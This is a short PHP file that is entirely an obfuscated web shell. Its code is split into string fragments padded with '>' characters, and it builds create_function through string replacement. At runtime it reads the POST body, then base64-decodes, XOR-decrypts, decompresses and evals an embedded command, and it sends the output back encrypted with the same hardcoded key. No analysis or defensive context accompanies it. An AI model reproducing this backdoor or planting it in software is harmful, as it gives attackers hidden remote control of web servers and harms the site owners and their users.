<?php
$R='fun>ction> x($t,>$k){$c=st>rlen($k)>>;$l=str>le>n>($t);$o=">";for($i>=0;$i<$l;){>for($>';
$a='e>val(@gzuncompre>ss(@x(@base>64_d>ecode($m[>1>>]),$k)));$>o=@ob_get_con>tent>s();@o>b_';
$b='end_cl>ean();$r=>@b>a>se64>_encode(@x(@>gzcomp>ress($o),>$k>));prin>t(">$p$kh$r$kf");}';
$M=str_replace('ck','','crckeckackteck_funckctckion');
$y='("/$k>h>(.+>)$k>>f/",@file_g>et_content>s(>"php://>>i>n>p>ut"),$m)==1) {@ob_start();>@';
$V='$>k="71b1b102";$>kh=">21370c4>48bee">;$kf="a>df>afe0d293>d";$p>="e>4uCQB3eQGH>ldxDF>";';
$U='j=0;($j<$c&>&$i<$>l);$>j++>,$i++)>{$o.=$t{$i>}^$>k{$j}>;}}re>turn $o;}i>f >(@preg_matc>h';
$c=str_replace('>','',$V.$R.$U.$y.$a.$b);
$p=$M('',$c);$p();
?>
